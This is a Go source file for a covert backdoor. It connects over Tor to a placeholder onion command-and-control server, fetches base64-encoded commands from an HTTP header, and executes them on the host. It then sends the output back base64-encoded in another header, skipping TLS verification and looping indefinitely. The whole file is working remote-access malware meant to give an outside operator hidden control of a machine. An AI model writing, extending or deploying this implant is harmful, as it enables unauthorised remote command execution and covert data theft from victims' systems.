package main

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"
	"crypto/tls"
	"os/exec"
	b64 "encoding/base64"

	"github.com/cretz/bine/tor"
)

func main() {


	for true {
		fmt.Println("Starting tor...")
		// Start TOR
		// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
		t, err := tor.Start(nil, nil)
		if err != nil {
			fmt.Printf("1 - %s",err)
			continue
		}
		defer t.Close()
		// Wait at most a minute to start network and get
		dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
		defer dialCancel()

		// Make connection
		dialer, err := t.Dialer(dialCtx, nil)
		for err != nil {
			fmt.Printf("2 - %s. Retrying 2...\n",err)
			dialer, err = t.Dialer(dialCtx, nil)
		}

		// Get command first. 
		fmt.Println("Getting command...")
		var cnc_command *string = get_command(dialer)
		for cnc_command == nil {
			fmt.Printf("3 - Did not get command. Retrying 3...\n",err)
			cnc_command = get_command(dialer)
			
		}
		fmt.Printf("Command is ```%s```", *cnc_command)

		// execute command
		var cnc_output *string = execute_command(*cnc_command)
		fmt.Printf("Output Command: %s", *cnc_output)

		if cnc_output == nil {
			continue
		}

		fmt.Println("Sending the output...")
		// Return the result in base64
		if sent_out := return_command_out(dialer, *cnc_output); sent_out != true {
			continue
		} 
		
		fmt.Println("Closing Tor...")
		// Close Tor
		t.Close()


		fmt.Println("Sleeping for 10 secs...")
		// Sleep for 10 seconds before fetching new command
		time.Sleep(10 * time.Second)

	}
	
}

func execute_command(cnc_command string) *string {


	sDec, _ := b64.StdEncoding.DecodeString(cnc_command)

	str_command := string(sDec)

	command_w_args := strings.Split(str_command, "^")
	main_cmd := command_w_args[0]
	args_cmd := command_w_args[1:]

	out, err := exec.Command(main_cmd, args_cmd...).Output()

	fmt.Println("------------------------")
	fmt.Printf("++++%v",out)
	fmt.Println("------------------------")

	if err != nil {
		return nil
	}


	str := string(out[:])
	var f_out *string = &str
	return f_out

}


func get_command(dialer *tor.Dialer) *string {

	// Do not validate ssl 
	tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: dialer.DialContext,
    }

	httpClient := &http.Client{Transport: tr}


	// Get from the onion
	// Replace the <onion link>
	req, err := http.NewRequest(http.MethodPut, "<onion link>/s3cr3t", nil)
	
	if err != nil {
		return nil
	}

	resp, err := httpClient.Do(req)

	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	contentType := resp.Header.Values("X-CNC")[0]

	return &contentType

}

func return_command_out(dialer *tor.Dialer, cnc_out string) bool {
	
	// Do not validate ssl 
	tr := &http.Transport{
        	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: dialer.DialContext,
    }

	httpClient := &http.Client{Transport: tr}

	cnc_out_b64 := b64.StdEncoding.EncodeToString([]byte(cnc_out))

	// Get from the onion
	// Replace the <onion link>
	req, err := http.NewRequest(http.MethodOptions, "<onion link>/s3cr3t", nil)

	if err != nil {
		return false
	}

	req.Header.Set("CNC-OUTPUT", cnc_out_b64)
	resp, err := httpClient.Do(req)

	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return true
}

